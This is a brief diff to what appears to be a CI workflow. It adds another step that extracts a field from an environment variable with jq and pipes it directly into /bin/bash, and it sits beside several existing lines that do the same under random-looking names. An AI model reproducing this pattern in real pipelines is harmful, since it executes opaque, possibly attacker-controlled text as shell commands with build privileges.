@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$xoj9" | jq -r .diuvu14 | /bin/bash
           printf '%s' "$swy4151" | jq -r .h746 | /bin/bash
           printf '%s' "$jcfcu85" | jq -r .v49 | /bin/bash
+          echo $v606 | jq -r .utx9118 | /bin/bash
 
       - name: Upload results
         if: always()
